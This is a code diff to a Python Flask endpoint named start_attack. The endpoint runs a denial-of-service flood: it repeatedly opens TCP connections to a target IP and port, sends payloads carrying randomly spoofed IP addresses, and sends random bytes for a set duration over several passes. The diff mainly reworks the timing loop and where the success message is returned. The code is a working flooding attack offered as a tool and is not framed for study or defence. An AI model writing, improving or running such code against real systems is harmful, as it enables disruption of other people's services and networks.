@@ -18,7 +18,9 @@ def start_attack():
     start_time = time.time()  # Record the start time of the attack
 
     def attack():
-        while time.time() - start_time < time_duration:  # Check if the attack duration has not elapsed
+        while True:  # Run indefinitely until stopped
+            if time.time() - start_time >= time_duration:  # Check if the attack duration has elapsed
+                break  # Exit the loop if the time is up
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, int(target_port)))
             fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
@@ -27,13 +29,14 @@ def start_attack():
             s.send(payload.encode())
             s.send(os.urandom(int(num_bytes)))
             s.close()
-        return jsonify({'success': True, 'message': 'Attack finished successfully.'})
-    
+
     for _ in range(int(data.get('threads', 10))):
         with suppress(Exception):
             attack()
     
-    # Move the return statement here
+    # Sleep for the remaining time if needed
+    
+    # Return success message
     return jsonify({'success': True, 'message': 'Attack finished successfully.'})
 
 if __name__ == '__main__':
